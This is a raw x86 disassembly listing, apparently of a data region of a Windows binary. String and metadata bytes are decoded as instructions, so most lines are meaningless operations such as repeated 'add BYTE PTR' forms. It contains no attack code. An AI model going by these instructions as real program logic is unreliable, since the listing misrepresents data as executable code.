  404fed:	jae    0x404fef
  404fef:	popa   
  404ff0:	add    BYTE PTR [edi+0x0],ah
  404ff3:	add    BYTE PTR gs:[eax],al
  404ff6:	sub    DWORD PTR [ebp+0x0],eax
  404ff9:	ins    DWORD PTR es:[edi],dx
  404ffa:	add    BYTE PTR [eax+0x0],dh
  404ffd:	je     0x404fff
  404fff:	jns    0x405001
  405001:	push   eax
  405002:	add    BYTE PTR [ecx+0x0],ch
  405005:	jo     0x405007
  405007:	add    BYTE PTR gs:[eax+eax*1+0x69],ch
  40500c:	add    BYTE PTR [esi+0x0],ch
  40500f:	add    BYTE PTR gs:[edx+0x0],dl
  405013:	add    BYTE PTR gs:[ebx+0x0],dh
  405017:	jne    0x405019
  405019:	ins    BYTE PTR es:[edi],dx
  40501a:	add    BYTE PTR [eax+eax*1+0x73],dh
  40501e:	add    BYTE PTR [eax],al
  405020:	sub    DWORD PTR [esi+0x0],ecx
  405023:	outs   dx,DWORD PTR ds:[esi]
  405024:	add    BYTE PTR [esi+0x0],ch
  405027:	push   esp
  405028:	add    BYTE PTR [ebp+0x0],ah
  40502b:	jb     0x40502d
  40502d:	ins    DWORD PTR es:[edi],dx
  40502e:	add    BYTE PTR [ecx+0x0],ch
  405031:	outs   dx,BYTE PTR ds:[esi]
  405032:	add    BYTE PTR [ecx+0x0],ah
  405035:	je     0x405037
  405037:	imul   eax,DWORD PTR [eax],0x67006e
  40503d:	inc    ebp
  40503e:	add    BYTE PTR [edx+0x0],dh
  405041:	jb     0x405043
  405043:	outs   dx,DWORD PTR ds:[esi]
  405044:	add    BYTE PTR [edx+0x0],dh
  405047:	jae    0x405049
  405049:	add    BYTE PTR [ecx],dh
  40504b:	push   ebx
  40504c:	add    BYTE PTR [ebx+0x0],ah
  40504f:	jb     0x405051
  405051:	imul   eax,DWORD PTR [eax],0x740070
  405057:	inc    ebp
  405058:	add    BYTE PTR [eax+0x0],bh
  40505b:	add    BYTE PTR gs:[ebx+0x0],ah
  40505f:	jne    0x405061
  405061:	je     0x405063
  405063:	imul   eax,DWORD PTR [eax],0x6e006f
  405069:	inc    ebp
  40506a:	add    BYTE PTR [eax+0x0],bh
  40506d:	arpl   WORD PTR [eax],ax
  40506f:	add    BYTE PTR gs:[eax+0x0],dh
  405073:	je     0x405075
  405075:	imul   eax,DWORD PTR [eax],0x6e006f
  40507b:	add    BYTE PTR [edi],bh
  40507d:	push   ebp
  40507e:	add    BYTE PTR [esi+0x0],ch
  405081:	imul   eax,DWORD PTR [eax],0x6e
  405084:	add    BYTE PTR [edi+0x0],ch
  405087:	ja     0x405089
  405089:	outs   dx,BYTE PTR ds:[esi]
  40508a:	add    BYTE PTR [ebx+0x0],dl
  40508d:	arpl   WORD PTR [eax],ax
  40508f:	jb     0x405091
  405091:	imul   eax,DWORD PTR [eax],0x740070
  405097:	inc    ebp
  405098:	add    BYTE PTR [eax+0x0],bh
  40509b:	add    BYTE PTR gs:[ebx+0x0],ah
  40509f:	jne    0x4050a1
  4050a1:	je     0x4050a3
  4050a3:	imul   eax,DWORD PTR [eax],0x6e006f
  4050a9:	inc    ebp
  4050aa:	add    BYTE PTR [eax+0x0],bh
  4050ad:	arpl   WORD PTR [eax],ax
  4050af:	add    BYTE PTR gs:[eax+0x0],dh
  4050b3:	je     0x4050b5
  4050b5:	imul   eax,DWORD PTR [eax],0x6e006f
  4050bb:	add    BYTE PTR ds:0x73006d,ch
  4050c1:	sub    eax,0x65006800
  4050c6:	add    BYTE PTR [eax+eax*1+0x70],ch
  4050ca:	add    BYTE PTR [edx],bh
  4050cc:	add    BYTE PTR [edi],ch
  4050ce:	add    BYTE PTR [edi],ch
  4050d0:	add    BYTE PTR [ebp+0x0],cl
  4050d3:	push   ebx
  4050d4:	add    BYTE PTR [esi],ch
  4050d6:	add    BYTE PTR [ebx+0x0],dl
  4050d9:	push   ecx
  4050da:	add    BYTE PTR [eax+eax*1+0x43],cl
  4050de:	add    BYTE PTR [ebx+0x0],al
  4050e1:	add    BYTE PTR cs:[esi+0x0],dh
  4050e5:	xor    DWORD PTR [eax],eax
  4050e7:	xor    DWORD PTR [eax],eax
  4050e9:	add    DWORD PTR [eax],eax
  4050eb:	add    BYTE PTR [ecx],bl
  4050ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050ef:	or     bl,BYTE PTR [edx-0x50bc8e6f]
  4050f5:	ins    BYTE PTR es:[edi],dx
  4050f6:	mov    bl,0x3c
  4050f8:	fwait
  4050f9:	sahf   
  4050fa:	lahf   
  4050fb:	je     0x4050fd
  4050fd:	or     BYTE PTR [edi+0x19565c7a],dh
  405103:	xor    al,0xe0
  405105:	mov    DWORD PTR ds:0x1d080100,eax
  40510b:	push   cs
  40510c:	or     BYTE PTR [ecx],dh
  40510e:	mov    edi,0x36ad5638
  405113:	dec    esi
  405114:	xor    eax,0x8010005
  405119:	adc    cl,BYTE PTR [ecx]
  40511b:	add    al,0x0
  40511d:	add    DWORD PTR [esi],ecx
  40511f:	sbb    al,0x5
  405121:	add    BYTE PTR [ecx],al
  405123:	push   cs
  405124:	adc    cl,BYTE PTR ds:0x1002003
  40512a:	add    al,0x0
  40512c:	add    BYTE PTR [edx],dl
  40512e:	adc    DWORD PTR ds:0x12010100,eax
  405134:	adc    DWORD PTR [ebx],eax
  405136:	add    BYTE PTR [eax],al
  405138:	push   cs
  405139:	push   es
  40513a:	add    BYTE PTR [ebx],al
  40513c:	push   cs
  40513d:	or     BYTE PTR [esi],cl
  40513f:	push   cs
  405140:	add    al,0x0
  405142:	add    DWORD PTR [esi],ecx
  405144:	push   cs
  405145:	add    al,0x8
  405147:	add    BYTE PTR [edx],dl
  405149:	adc    DWORD PTR [ebx],eax
  40514b:	or     BYTE PTR [eax],al
  40514d:	push   cs
  40514e:	add    al,BYTE PTR [esi]
  405150:	push   cs
  405151:	and    BYTE PTR [ebx+0x0],al
  405154:	popa   
  405155:	add    BYTE PTR [esi+0x0],ch
  405158:	outs   dx,BYTE PTR ds:[esi]
  405159:	add    BYTE PTR [edi+0x0],ch
  40515c:	je     0x40515e
  40515e:	dec    ecx
  40515f:	add    BYTE PTR [esi+0x0],ch
  405162:	imul   eax,DWORD PTR [eax],0x690074
  405168:	popa   
  405169:	add    BYTE PTR [eax+eax*1+0x69],ch
  40516d:	add    BYTE PTR [edx+0x0],bh
  405170:	add    BYTE PTR gs:[edx+eax*2],cl
  405174:	add    BYTE PTR [ecx+0x0],ah
  405177:	outs   dx,BYTE PTR ds:[esi]
  405178:	add    BYTE PTR [esi+0x0],ch
  40517b:	add    BYTE PTR gs:[edx+0x0],dh
  40517f:	or     BYTE PTR [eax+0x0],cl
  405182:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  405187:	add    BYTE PTR [eax],dh
  405189:	push   ebx
  40518a:	add    BYTE PTR [ebx+0x0],ah
  40518d:	jb     0x40518f
  40518f:	imul   eax,DWORD PTR [eax],0x740070
  405195:	inc    ebp
  405196:	add    BYTE PTR [eax+0x0],bh
  405199:	add    BYTE PTR gs:[ebx+0x0],ah
  40519d:	jne    0x40519f
  40519f:	je     0x4051a1
  4051a1:	imul   eax,DWORD PTR [eax],0x6e006f
  4051a7:	inc    ebp
  4051a8:	add    BYTE PTR [eax+0x0],bh
  4051ab:	arpl   WORD PTR [eax],ax
  4051ad:	add    BYTE PTR gs:[eax+0x0],dh
  4051b1:	je     0x4051b3
  4051b3:	imul   eax,DWORD PTR [eax],0x6e006f
  4051b9:	ds push ebp
  4051bb:	add    BYTE PTR [esi+0x0],ch
  4051be:	imul   eax,DWORD PTR [eax],0x6e
  4051c1:	add    BYTE PTR [edi+0x0],ch
  4051c4:	ja     0x4051c6
  4051c6:	outs   dx,BYTE PTR ds:[esi]
  4051c7:	add    BYTE PTR [ebx+0x0],dl
  4051ca:	arpl   WORD PTR [eax],ax
  4051cc:	jb     0x4051ce
  4051ce:	imul   eax,DWORD PTR [eax],0x740070
  4051d4:	inc    ebp
  4051d5:	add    BYTE PTR [eax+0x0],bh
  4051d8:	add    BYTE PTR gs:[ebx+0x0],ah
  4051dc:	jne    0x4051de
  4051de:	je     0x4051e0
  4051e0:	imul   eax,DWORD PTR [eax],0x6e006f
  4051e6:	inc    ebp
  4051e7:	add    BYTE PTR [eax+0x0],bh
  4051ea:	arpl   WORD PTR [eax],ax
  4051ec:	add    BYTE PTR gs:[eax+0x0],dh
  4051f0:	je     0x4051f2
  4051f2:	imul   eax,DWORD PTR [eax],0x6e006f
  4051f8:	and    al,0x45
  4051fa:	add    BYTE PTR [edx+0x0],dh
  4051fd:	jb     0x4051ff
  4051ff:	outs   dx,DWORD PTR ds:[esi]
  405200:	add    BYTE PTR [edx+0x0],dh
  405203:	push   edx
  405204:	add    BYTE PTR [ebp+0x0],ah
  405207:	popa   
  405208:	add    BYTE PTR [eax+eax*1+0x69],ah
  40520c:	add    BYTE PTR [esi+0x0],ch
  40520f:	add    BYTE PTR [bp+di+0x0],dl
  405213:	arpl   WORD PTR [eax],ax
  405215:	jb     0x405217
  405217:	imul   eax,DWORD PTR [eax],0x740070
  40521d:	cmp    al,0x45
  40521f:	add    BYTE PTR [edx+0x0],dh
  405222:	jb     0x405224
  405224:	outs   dx,DWORD PTR ds:[esi]
  405225:	add    BYTE PTR [edx+0x0],dh
  405228:	inc    ecx
  405229:	add    BYTE PTR [eax+eax*1+0x6c],ch
  40522d:	add    BYTE PTR [edi+0x0],ch
  405230:	arpl   WORD PTR [eax],ax
  405232:	popa   
  405233:	add    BYTE PTR [eax+eax*1+0x69],dh
  405237:	add    BYTE PTR [esi+0x0],ch
  40523a:	add    BYTE PTR [di+0x0],cl
  40523e:	add    BYTE PTR gs:[ebp+0x0],ch
  405242:	outs   dx,DWORD PTR ds:[esi]
  405243:	add    BYTE PTR [edx+0x0],dh
  405246:	jns    0x405248
  405248:	inc    esi
  405249:	add    BYTE PTR [edi+0x0],ch
  40524c:	jb     0x40524e
  40524e:	push   ebx
  40524f:	add    BYTE PTR [ebx+0x0],ah
  405252:	jb     0x405254
  405254:	imul   eax,DWORD PTR [eax],0x740070
  40525a:	and    al,0x45
  40525c:	add    BYTE PTR [ebp+0x0],ch
  40525f:	jo     0x405261
  405261:	je     0x405263
  405263:	jns    0x405265
  405265:	push   ebx
  405266:	add    BYTE PTR [ebx+0x0],ah
  405269:	jb     0x40526b
  40526b:	imul   eax,DWORD PTR [eax],0x740070
  405271:	dec    ebp
  405272:	add    BYTE PTR [ebp+0x0],ah
  405275:	jae    0x405277
  405277:	jae    0x405279
  405279:	popa   
  40527a:	add    BYTE PTR [edi+0x0],ah
  40527d:	add    BYTE PTR gs:[eax],ch
  405280:	inc    ebp
  405281:	add    BYTE PTR [ebp+0x0],ch
  405284:	jo     0x405286
  405286:	je     0x405288
  405288:	jns    0x40528a
  40528a:	push   eax
  40528b:	add    BYTE PTR [ecx+0x0],ch
  40528e:	jo     0x405290
  405290:	add    BYTE PTR gs:[eax+eax*1+0x69],ch
  405295:	add    BYTE PTR [esi+0x0],ch
  405298:	add    BYTE PTR gs:[edx+0x0],dl
  40529c:	add    BYTE PTR gs:[ebx+0x0],dh
  4052a0:	jne    0x4052a2
  4052a2:	ins    BYTE PTR es:[edi],dx
  4052a3:	add    BYTE PTR [eax+eax*1+0x73],dh
  4052a7:	add    BYTE PTR [eax],ch
  4052a9:	dec    esi
  4052aa:	add    BYTE PTR [edi+0x0],ch
  4052ad:	outs   dx,BYTE PTR ds:[esi]
  4052ae:	add    BYTE PTR [eax+eax*1+0x65],dl
  4052b2:	add    BYTE PTR [edx+0x0],dh
  4052b5:	ins    DWORD PTR es:[edi],dx
  4052b6:	add    BYTE PTR [ecx+0x0],ch
  4052b9:	outs   dx,BYTE PTR ds:[esi]
  4052ba:	add    BYTE PTR [ecx+0x0],ah
  4052bd:	je     0x4052bf
  4052bf:	imul   eax,DWORD PTR [eax],0x67006e
  4052c5:	inc    ebp
  4052c6:	add    BYTE PTR [edx+0x0],dh
  4052c9:	jb     0x4052cb
  4052cb:	outs   dx,DWORD PTR ds:[esi]
  4052cc:	add    BYTE PTR [edx+0x0],dh
  4052cf:	jae    0x4052d1
  4052d1:	add    eax,DWORD PTR [esi]
  4052d3:	adc    dl,BYTE PTR ds:0x11120603
  4052d9:	add    eax,0xe0e0200
  4052de:	sbb    al,0x7
  4052e0:	add    BYTE PTR [esi+ecx*1],al
  4052e3:	push   cs
  4052e4:	sbb    al,0x1c
  4052e6:	sbb    al,0x10
  4052e8:	xor    DWORD PTR [eax],eax
  4052ea:	xor    DWORD PTR [eax],eax
  4052ec:	add    BYTE PTR cs:[eax],dh
  4052ef:	add    BYTE PTR [esi],ch
  4052f1:	add    BYTE PTR [eax],dh
  4052f3:	add    BYTE PTR [esi],ch
  4052f5:	add    BYTE PTR [eax],dh
  4052f7:	add    BYTE PTR [edx],al
  4052f9:	push   es
  4052fa:	or     BYTE PTR [ebx+ecx*1],al
  4052fd:	add    BYTE PTR [eax],al
  4052ff:	add    BYTE PTR [eax+eax*1],al
  405302:	add    BYTE PTR [eax],al
  405304:	add    BYTE PTR [esp+esi*1],al
  405307:	or     BYTE PTR [eax],al
  405309:	add    BYTE PTR [eax],cl
  40530b:	xor    DWORD PTR [eax],eax
  40530d:	xor    DWORD PTR [eax],eax
  40530f:	add    BYTE PTR cs:[eax],dh
  405312:	add    BYTE PTR [eax],ch
  405314:	dec    ebp
  405315:	add    BYTE PTR [ecx+0x0],ch
  405318:	arpl   WORD PTR [eax],ax
  40531a:	jb     0x40531c
  40531c:	outs   dx,DWORD PTR ds:[esi]
  40531d:	add    BYTE PTR [ebx+0x0],dh
  405320:	outs   dx,DWORD PTR ds:[esi]
  405321:	add    BYTE PTR [esi+0x0],ah
  405324:	je     0x405326
  405326:	and    BYTE PTR [eax],al
  405328:	push   ebx
  405329:	add    BYTE PTR [ecx+0x0],dl
  40532c:	dec    esp
  40532d:	add    BYTE PTR [eax],ah
  40532f:	add    BYTE PTR [ebx+0x0],dl
  405332:	add    BYTE PTR gs:[edx+0x0],dh
  405336:	jbe    0x405338
  405338:	add    BYTE PTR gs:[edx+0x0],dh
  40533c:	sbb    BYTE PTR [eax+0x30007b],0x78
  405343:	add    BYTE PTR [edx+0x0],ah
  405346:	add    BYTE PTR fs:[edi],dh
  405349:	add    BYTE PTR [esi+0x0],ah
  40534c:	aaa    
  40534d:	add    BYTE PTR [ebx+0x0],ah
  405350:	xor    BYTE PTR [eax],al
  405352:	add    BYTE PTR fs:[eax+eax*1],ch
  405356:	and    BYTE PTR [eax],al
  405358:	xor    BYTE PTR [eax],al
  40535a:	js     0x40535c
  40535c:	aaa    
  40535d:	add    BYTE PTR [ebx+0x0],ah
  405360:	xor    eax,DWORD PTR [eax]
  405362:	add    BYTE PTR ss:[eax+eax*1],ch
  405366:	and    BYTE PTR [eax],al
  405368:	xor    BYTE PTR [eax],al
  40536a:	js     0x40536c
  40536c:	xor    al,0x0
  40536e:	aaa    
  40536f:	add    BYTE PTR [edx],dh
  405371:	add    BYTE PTR [ecx],dh
  405373:	add    BYTE PTR [eax+eax*1],ch
  405376:	and    BYTE PTR [eax],al
  405378:	jnp    0x40537a
  40537a:	xor    BYTE PTR [eax],al
  40537c:	js     0x40537e
  40537e:	popa   
  40537f:	add    BYTE PTR [esi+0x0],ah
  405382:	sub    al,0x0
  405384:	and    BYTE PTR [eax],al
  405386:	xor    BYTE PTR [eax],al
  405388:	js     0x40538a
  40538a:	popa   
  40538b:	add    BYTE PTR [eax],bh
  40538d:	add    BYTE PTR [eax+eax*1],ch
  405390:	and    BYTE PTR [eax],al
  405392:	xor    BYTE PTR [eax],al
  405394:	js     0x405396
  405396:	bound  eax,QWORD PTR [eax]
  405398:	sub    al,0x0
  40539a:	and    BYTE PTR [eax],al
  40539c:	xor    BYTE PTR [eax],al
  40539e:	js     0x4053a0
  4053a0:	popa   
  4053a1:	add    BYTE PTR [edi],dh
  4053a3:	add    BYTE PTR [eax+eax*1],ch
  4053a6:	and    BYTE PTR [eax],al
  4053a8:	xor    BYTE PTR [eax],al
  4053aa:	js     0x4053ac
  4053ac:	xor    BYTE PTR [eax],al
  4053ae:	sub    al,0x0
  4053b0:	and    BYTE PTR [eax],al
  4053b2:	xor    BYTE PTR [eax],al
  4053b4:	js     0x4053b6
  4053b6:	add    BYTE PTR gs:[edx],dh
  4053b9:	add    BYTE PTR [eax+eax*1],ch
  4053bc:	and    BYTE PTR [eax],al
  4053be:	xor    BYTE PTR [eax],al
  4053c0:	js     0x4053c2
  4053c2:	add    BYTE PTR ss:[eax+eax*1+0x2c],ah
  4053c7:	add    BYTE PTR [eax],ah
  4053c9:	add    BYTE PTR [eax],dh
  4053cb:	add    BYTE PTR [eax+0x0],bh
  4053ce:	cmp    DWORD PTR [eax],eax
  4053d0:	add    BYTE PTR gs:[ebp+0x0],bh
  4053d4:	jge    0x4053d6
  4053d6:	push   ds
  4053d7:	push   ebx
  4053d8:	add    BYTE PTR [ecx+0x0],dl
  4053db:	dec    esp
  4053dc:	add    BYTE PTR [eax],ah
  4053de:	add    BYTE PTR [ebx+0x0],dl
  4053e1:	add    BYTE PTR gs:[edx+0x0],dh
  4053e5:	jbe    0x4053e7
  4053e7:	add    BYTE PTR gs:[edx+0x0],dh
  4053eb:	and    BYTE PTR [eax],al
  4053ed:	xor    al,BYTE PTR [eax]
  4053ef:	xor    BYTE PTR [eax],al
  4053f1:	xor    DWORD PTR [eax],eax
  4053f3:	xor    al,BYTE PTR [eax]
  4053f5:	xor    cl,BYTE PTR [ebp+0x0]
  4053f8:	imul   eax,DWORD PTR [eax],0x720063
  4053fe:	outs   dx,DWORD PTR ds:[esi]
  4053ff:	add    BYTE PTR [ebx+0x0],dh
  405402:	outs   dx,DWORD PTR ds:[esi]
  405403:	add    BYTE PTR [esi+0x0],ah
  405406:	je     0x405408
  405408:	and    BYTE PTR [eax],al
  40540a:	push   ebx
  40540b:	add    BYTE PTR [ecx+0x0],dl
  40540e:	dec    esp
  40540f:	add    BYTE PTR [eax],ah
  405411:	add    BYTE PTR [ebx+0x0],dl
  405414:	add    BYTE PTR gs:[edx+0x0],dh
  405418:	jbe    0x40541a
  40541a:	add    BYTE PTR gs:[edx+0x0],dh
  40541e:	and    BYTE PTR [eax],al
  405420:	xor    al,BYTE PTR [eax]
  405422:	xor    BYTE PTR [eax],al
  405424:	xor    DWORD PTR [eax],eax
  405426:	xor    al,BYTE PTR [eax]
  405428:	push   es
  405429:	xor    DWORD PTR [eax],eax
  40542b:	xor    DWORD PTR [eax],eax
  40542d:	xor    BYTE PTR [eax],al
  40542f:	or     dh,BYTE PTR [ebx+0x0]
  405432:	jno    0x405434
  405434:	ins    BYTE PTR es:[edi],dx
  405435:	add    BYTE PTR [ecx],dh
  405437:	add    BYTE PTR [ecx],dh
  405439:	add    BYTE PTR [edx],dh
  40543b:	push   ebx
  40543c:	add    BYTE PTR [ecx+0x0],dl
  40543f:	dec    esp
  405440:	add    BYTE PTR [ebx+0x0],dl
  405443:	add    BYTE PTR gs:[edx+0x0],dh
  405447:	jbe    0x405449
  405449:	add    BYTE PTR gs:[edx+0x0],dh
  40544d:	inc    edx
  40544e:	add    BYTE PTR [edi+0x0],ch
  405451:	outs   dx,DWORD PTR ds:[esi]
  405452:	add    BYTE PTR [ebx+0x0],ch
  405455:	jae    0x405457
  405457:	dec    edi
  405458:	add    BYTE PTR [esi+0x0],ch
  40545b:	ins    BYTE PTR es:[edi],dx
  40545c:	add    BYTE PTR [ecx+0x0],ch
  40545f:	outs   dx,BYTE PTR ds:[esi]
  405460:	add    BYTE PTR [ebp+0x0],ah
  405463:	add    BYTE PTR cs:[ecx],dh
  405466:	add    BYTE PTR [ecx],dh
  405468:	add    BYTE PTR [esi],ch
  40546a:	add    BYTE PTR [eax],dh
  40546c:	add    BYTE PTR [edx],bl
  40546e:	push   ebx
  40546f:	add    BYTE PTR [ecx+0x0],dl
  405472:	dec    esp
  405473:	add    BYTE PTR [ebx+0x0],dl
  405476:	add    BYTE PTR gs:[edx+0x0],dh
  40547a:	jbe    0x40547c
  40547c:	add    BYTE PTR gs:[edx+0x0],dh
  405480:	xor    al,BYTE PTR [eax]
  405482:	xor    BYTE PTR [eax],al
  405484:	xor    DWORD PTR [eax],eax
  405486:	xor    al,BYTE PTR [eax]
  405488:	dec    eax
  405489:	aaa    
  40548a:	add    BYTE PTR [esi+0x0],ah
  40548d:	add    BYTE PTR gs:[eax+eax*1],dh
  405491:	add    BYTE PTR ss:[ebx],dh
  405494:	add    BYTE PTR [eax],dh
  405496:	add    BYTE PTR [ecx+0x0],ah
  405499:	sub    eax,0x33003000
  40549e:	add    BYTE PTR [ebx],dh
  4054a0:	add    BYTE PTR [eax],dh
  4054a2:	add    BYTE PTR ds:0x62003400,ch
  4054a8:	add    BYTE PTR [eax],dh
  4054aa:	add    BYTE PTR [ecx],dh
  4054ac:	add    BYTE PTR ds:0x35006100,ch
  4054b2:	add    BYTE PTR [ebp+0x0],ah
  4054b5:	add    BYTE PTR ss:0x37006100,ch
  4054bc:	add    BYTE PTR [edi],dh
  4054be:	add    BYTE PTR [ebx+0x0],ah
  4054c1:	aaa    
  4054c2:	add    BYTE PTR [ecx+0x0],ah
  4054c5:	add    BYTE PTR fs:[ebx],dh
  4054c8:	add    BYTE PTR [eax+eax*1],dh
  4054cb:	add    BYTE PTR gs:[edx+0x0],ah
  4054cf:	xor    BYTE PTR [eax],al
  4054d1:	dec    esp
  4054d2:	jnp    0x4054d4
  4054d4:	aaa    
  4054d5:	add    BYTE PTR [esi+0x0],ah
  4054d8:	xor    DWORD PTR [eax],eax
  4054da:	xor    al,BYTE PTR [eax]
  4054dc:	xor    DWORD PTR [eax],eax
  4054de:	arpl   WORD PTR [eax],ax
  4054e0:	xor    eax,DWORD PTR [eax]
  4054e2:	xor    eax,0x66002d00
  4054e7:	add    BYTE PTR [eax],dh
  4054e9:	add    BYTE PTR [ecx],bh
  4054eb:	add    BYTE PTR ds:0x34002d00,dh
  4054f1:	add    BYTE PTR [edi],dh
  4054f3:	add    BYTE PTR [ecx+0x0],ah
  4054f6:	popa   
  4054f7:	add    BYTE PTR ds:0x63006200,ch
  4054fd:	add    BYTE PTR [eax],dh
  4054ff:	add    BYTE PTR [eax+eax*1],dh
  405502:	sub    eax,0x32006400
  405507:	add    BYTE PTR [ecx],dh
  405509:	add    BYTE PTR [eax+eax*1],dh
  40550c:	bound  eax,QWORD PTR [eax]
  40550e:	arpl   WORD PTR [eax],ax
  405510:	xor    BYTE PTR [eax],al
  405512:	xor    al,0x0
  405514:	aaa    
  405515:	add    BYTE PTR [edx],dh
  405517:	add    BYTE PTR [edi],dh
  405519:	add    BYTE PTR [ecx+0x0],ah
  40551c:	jge    0x40551e
  40551e:	push   cs
  40551f:	push   ebx
  405520:	add    BYTE PTR [ecx+0x0],dl
  405523:	dec    esp
  405524:	add    BYTE PTR [edx],dh
  405526:	add    BYTE PTR [eax],dh
  405528:	add    BYTE PTR [ecx],dh
  40552a:	add    BYTE PTR [ecx],dh
  40552c:	add    BYTE PTR [esi],cl
  40552e:	dec    ebp
  40552f:	add    BYTE PTR [ebx+0x0],dl
  405532:	push   ebx
  405533:	add    BYTE PTR [ecx+0x0],dl
  405536:	dec    esp
  405537:	add    BYTE PTR [ecx],dh
  405539:	add    BYTE PTR [ecx],dh
  40553b:	add    BYTE PTR [ecx*2+0x41005300],cl
  405542:	add    BYTE PTR [ebx+0x0],dl
  405545:	xor    DWORD PTR [eax],eax
  405547:	xor    DWORD PTR [eax],eax
  405549:	or     al,0x4d
  40554b:	add    BYTE PTR [ebx+0x0],dl
  40554e:	push   edx
  40554f:	add    BYTE PTR [ebx+0x0],dl
  405552:	xor    DWORD PTR [eax],eax
  405554:	xor    DWORD PTR [eax],eax
  405556:	add    al,BYTE PTR [esi]
  405558:	or     DWORD PTR [esp+esi*4],eax
  40555b:	add    BYTE PTR [eax],al
  40555d:	add    BYTE PTR [edx],dl
  40555f:	push   ebx
  405560:	add    BYTE PTR [ecx+0x0],dl
  405563:	dec    esp
  405564:	add    BYTE PTR [ecx],dh
  405566:	add    BYTE PTR [ecx],dh
  405568:	add    BYTE PTR [eax],dh
  40556a:	add    BYTE PTR [ebp+0x0],cl
  40556d:	push   ebx
  40556e:	add    BYTE PTR [ecx+0x0],cl
  405571:	push   ds
  405572:	push   ebx
  405573:	add    BYTE PTR [ecx+0x0],dl
  405576:	dec    esp
  405577:	add    BYTE PTR [ecx],dh
  405579:	add    BYTE PTR [ecx],dh
  40557b:	add    BYTE PTR [eax],dh
  40557d:	add    BYTE PTR [ebp+0x0],al
  405580:	js     0x405582
  405582:	arpl   WORD PTR [eax],ax
  405584:	add    BYTE PTR gs:[eax+0x0],dh
  405588:	je     0x40558a
  40558a:	imul   eax,DWORD PTR [eax],0x6e006f
  405590:	sbb    BYTE PTR [ebx+edi*2+0x78003000],0x0
  405598:	xor    al,BYTE PTR [eax]
  40559a:	xor    al,0x0
  40559c:	xor    DWORD PTR [eax],eax
  40559e:	xor    al,0x0
  4055a0:	bound  eax,QWORD PTR [eax]
  4055a2:	arpl   WORD PTR [eax],ax
  4055a4:	xor    DWORD PTR [eax],eax
  4055a6:	bound  eax,QWORD PTR [eax]
  4055a8:	sub    al,0x0
  4055aa:	and    BYTE PTR [eax],al
  4055ac:	xor    BYTE PTR [eax],al
  4055ae:	js     0x4055b0
  4055b0:	xor    DWORD PTR [eax],eax
  4055b2:	xor    eax,0x32003700
  4055b7:	add    BYTE PTR [eax+eax*1],ch
  4055ba:	and    BYTE PTR [eax],al
  4055bc:	xor    BYTE PTR [eax],al
  4055be:	js     0x4055c0
  4055c0:	xor    al,0x0
  4055c2:	arpl   WORD PTR [eax],ax
  4055c4:	add    BYTE PTR fs:[ecx],bh
  4055c7:	add    BYTE PTR [eax+eax*1],ch
  4055ca:	and    BYTE PTR [eax],al
  4055cc:	jnp    0x4055ce
  4055ce:	xor    BYTE PTR [eax],al
  4055d0:	js     0x4055d2
  4055d2:	cmp    DWORD PTR [eax],eax
  4055d4:	arpl   WORD PTR [eax],ax
  4055d6:	sub    al,0x0
  4055d8:	and    BYTE PTR [eax],al
  4055da:	xor    BYTE PTR [eax],al
  4055dc:	js     0x4055de
  4055de:	popa   
  4055df:	add    BYTE PTR ds:0x20002c00,dh
  4055e5:	add    BYTE PTR [eax],dh
  4055e7:	add    BYTE PTR [eax+0x0],bh
  4055ea:	add    BYTE PTR ss:0x20002c00,dh
  4055f1:	add    BYTE PTR [eax],dh
  4055f3:	add    BYTE PTR [eax+0x0],bh
  4055f6:	xor    DWORD PTR [eax],eax
  4055f8:	add    BYTE PTR ss:[eax+eax*1],ch
  4055fc:	and    BYTE PTR [eax],al
  4055fe:	xor    BYTE PTR [eax],al
  405600:	js     0x405602
  405602:	add    BYTE PTR ss:[eax+eax*1+0x2c],ah
  405607:	add    BYTE PTR [eax],ah
  405609:	add    BYTE PTR [eax],dh
  40560b:	add    BYTE PTR [eax+0x0],bh
  40560e:	cmp    BYTE PTR [eax],al
  405610:	add    BYTE PTR fs:[eax+eax*1],ch
  405614:	and    BYTE PTR [eax],al
  405616:	xor    BYTE PTR [eax],al
  405618:	js     0x40561a
  40561a:	add    BYTE PTR gs:[esi+0x0],ah
  40561e:	sub    al,0x0
  405620:	and    BYTE PTR [eax],al
  405622:	xor    BYTE PTR [eax],al
  405624:	js     0x405626
  405626:	xor    eax,DWORD PTR [eax]
  405628:	add    BYTE PTR fs:[ebp+0x0],bh
  40562c:	jge    0x40562e
  40562e:	sub    ch,BYTE PTR [ebp+0x0]
  405631:	jae    0x405633
  405633:	sub    eax,0x65006800
  405638:	add    BYTE PTR [eax+eax*1+0x70],ch
  40563c:	add    BYTE PTR [edx],bh
  40563e:	add    BYTE PTR [edi],ch
  405640:	add    BYTE PTR [edi],ch
  405642:	add    BYTE PTR [ebp+0x0],cl
  405645:	push   ebx
  405646:	add    BYTE PTR [esi],ch
  405648:	add    BYTE PTR [esi+0x0],dl
  40564b:	push   ebx
  40564c:	add    BYTE PTR [ebx+0x0],al
  40564f:	inc    ebx
  405650:	add    BYTE PTR [esi],ch
  405652:	add    BYTE PTR [esi+0x0],dh
  405655:	cmp    DWORD PTR [eax],eax
  405657:	xor    BYTE PTR [eax],al
  405659:	or     BYTE PTR [ecx],dh
  40565b:	add    BYTE PTR [eax],dh
  40565d:	add    BYTE PTR [esi],ch
  40565f:	add    BYTE PTR [eax],dh
  405661:	add    BYTE PTR [eax+eiz*1],al
  405664:	add    DWORD PTR [ecx],eax
  405666:	add    al,BYTE PTR [eax+eiz*1]
  405669:	add    DWORD PTR [ecx],eax
  40566b:	push   cs
  40566c:	add    eax,0x11010120
  405671:	pop    ecx
  405672:	add    al,0x20
  405674:	add    DWORD PTR [ecx],eax
  405676:	or     BYTE PTR [eax+0x2400a0],al
  40567c:	add    BYTE PTR [eax+eax*4],al
  40567f:	add    BYTE PTR [eax],al
  405681:	xchg   esp,eax
  405682:	add    BYTE PTR [eax],al
  405684:	add    BYTE PTR [esi],al
  405686:	add    al,BYTE PTR [eax]
  405688:	add    BYTE PTR [eax],al
  40568a:	and    al,0x0
  40568c:	add    BYTE PTR [edx+0x53],dl
  40568f:	inc    ecx
  405690:	xor    DWORD PTR [eax],eax
  405692:	add    al,0x0
  405694:	add    BYTE PTR [ecx],al
  405696:	add    BYTE PTR [ecx],al
  405698:	add    BYTE PTR [edi],ah
  40569a:	daa    
  40569b:	lods   eax,DWORD PTR ss:[esi]
  40569d:	outs   dx,BYTE PTR ds:[esi]
  40569e:	pop    edi
  40569f:	xchg   ebp,eax
